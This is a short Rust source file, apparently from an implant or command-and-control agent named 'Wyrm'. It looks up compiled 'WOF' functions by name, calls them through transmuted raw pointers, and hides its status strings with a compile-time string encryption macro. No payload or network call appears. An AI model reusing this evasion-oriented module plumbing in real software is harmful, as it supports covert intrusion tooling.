use std::{mem::transmute, ptr::null};

use shared::tasks::WyrmResult;
use str_crypter::{decrypt_string, sc};

include!(concat!(env!("OUT_DIR"), "/wof.rs"));

/// The shape of the WOF
type FfiShape = unsafe extern "C" fn(*const c_void) -> i32;

fn get_wof_fn_ptr(needle: &str) -> Option<FfiShape> {
    let wofs = all_wofs();

    for wof in wofs {
        if wof.0 == needle && !wof.1.is_null() {
            let f = unsafe { transmute::<_, FfiShape>(wof.1) };
            return Some(f);
        }
    }

    None
}

fn call_static_wof(fn_name: &str) -> WyrmResult<String> {
    let Some(f) = get_wof_fn_ptr(fn_name) else {
        let err = format!(
            "{} {fn_name}",
            sc!("Could not find WOF function", 175).unwrap()
        );
        return WyrmResult::Err(err);
    };

    unsafe { f(null()) };

    let msg = sc!("WOF executed", 97).unwrap();
    return WyrmResult::Ok(msg);
}
